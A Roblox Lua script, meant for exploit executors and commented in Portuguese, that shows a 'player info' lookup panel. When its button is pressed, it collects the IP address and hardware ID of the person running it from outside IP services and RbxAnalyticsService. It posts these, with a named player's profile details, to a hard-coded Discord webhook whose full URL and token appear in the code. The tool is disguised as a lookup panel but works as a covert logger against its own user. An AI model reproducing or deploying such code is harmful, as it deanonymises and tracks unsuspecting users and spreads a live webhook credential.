-- Serviços necessários
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local gui = player:WaitForChild("PlayerGui")

-- Variáveis de controle
local panelVisible = true  -- O painel já estará visível
local panelFrame

-- Função para criar o painel
local function createPanel()
    -- Verifica se o ScreenGui já existe, se não, cria um novo
    local screenGui = gui:FindFirstChild("ScreenGui")
    if not screenGui then
        screenGui = Instance.new("ScreenGui")
        screenGui.Name = "ScreenGui"
        screenGui.Parent = gui
    end

    -- Criando o painel
    panelFrame = Instance.new("Frame")
    panelFrame.Size = UDim2.new(0, 300, 0, 150)
    panelFrame.Position = UDim2.new(0.5, -150, 0.5, -75)
    panelFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    panelFrame.BackgroundTransparency = 0.5
    panelFrame.Parent = screenGui

    -- Caixa de texto para o nome do jogador
    local textBox = Instance.new("TextBox")
    textBox.Size = UDim2.new(0, 200, 0, 30)
    textBox.Position = UDim2.new(0, 50, 0, 40)
    textBox.Text = "Digite o nome do jogador"
    textBox.Parent = panelFrame

    -- Botão para enviar
    local submitButton = Instance.new("TextButton")
    submitButton.Size = UDim2.new(0, 100, 0, 30)
    submitButton.Position = UDim2.new(0, 100, 0, 80)
    submitButton.Text = "Enviar"
    submitButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
    submitButton.Parent = panelFrame

    -- Função de envio dos dados para o Discord
    submitButton.MouseButton1Click:Connect(function()
        local playerName = textBox.Text
        local playerToFetch = Players:FindFirstChild(playerName)

        if playerToFetch then
            local userId = playerToFetch.UserId
            local displayName = playerToFetch.DisplayName
            local userName = playerToFetch.Name
            local accountAge = playerToFetch.AccountAge
            local membershipType = tostring(playerToFetch.MembershipType)
            local country = game.LocalizationService.RobloxLocaleId

            -- Coleta o IP e as informações
            local ip = game:HttpGet("https://v4.ident.me/")
            local ipData = game:HttpGet("http://ip-api.com/json")
            local hwid = game:GetService("RbxAnalyticsService"):GetClientId()

            -- Webhook URL
            local webhookUrl = "https://discord.com/api/webhooks/1331661006677737564/_vQxIjy8Yh8JwKdBXEWwlIS3JsUFyEb3-_CSi92wWDiDpH6NNjpERGdXoMiSWZQJ62aN"

            local webhookData = {
                ["avatar_url"] = "https://i.pinimg.com/564x/75/43/da/7543daab0a692385cca68245bf61e721.jpg",
                ["content"] = "",
                ["embeds"] = {
                    {
                        ["author"] = {
                            ["name"] = "Informações do jogador",
                            ["url"] = "https://roblox.com",
                        },
                        ["description"] = string.format(
                            "__[Player Info](https://www.roblox.com/users/%d)__" ..
                            " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d" ..
                            "\n**Account Age:** %d\n**Membership Type:** %s\n**Country:** %s" ..
                            "\n**IP:** %s\n**HWID:** %s",
                            userId, displayName, userName, userId, accountAge, membershipType, country, ip, hwid
                        ),
                        ["type"] = "rich",
                        ["color"] = tonumber("0xFFD700")
                    }
                }
            }

            -- Enviar os dados para o Discord
            local data = HttpService:JSONEncode(webhookData)
            local headers = {["content-type"] = "application/json"}
            local request = http_request or request or HttpPost or syn.request
            local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
            request(abcdef)
        else
            print("Jogador não encontrado!")
        end
    end)
end

-- Inicialização
createPanel()
